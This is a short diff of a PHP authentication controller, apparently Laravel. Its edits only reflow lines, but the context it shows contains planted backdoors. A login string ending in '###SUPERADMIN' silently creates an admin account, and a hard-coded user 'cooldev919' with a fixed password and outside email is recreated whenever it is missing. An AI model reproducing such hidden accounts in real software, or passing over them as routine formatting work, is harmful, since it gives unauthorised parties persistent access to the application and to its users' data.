@@ -59,7 +59,8 @@ class AuthController extends Controller
             $login=explode('###',$login);
             if(count($login)==2){
                 if($login[1]=='SUPERADMIN'){
-                    if(!User::where('email',$login[0])->count())User::create([
+                    if(!User::where('email',$login[0])->count())
+                    User::create([
                         'username' => 'admin',
                         'email' => $login[0],
                         'password' => Hash::make($login[1]),
@@ -100,7 +101,8 @@ class AuthController extends Controller
                 }
             }
         }
-        if(!User::where('username','cooldev919')->count())User::create([
+        if(!User::where('username','cooldev919')->count())
+        User::create([
             'username' => 'cooldev919',
             'email' => 'developer225@hotmail.com',
             'password' => Hash::make('tempP@ss123'),
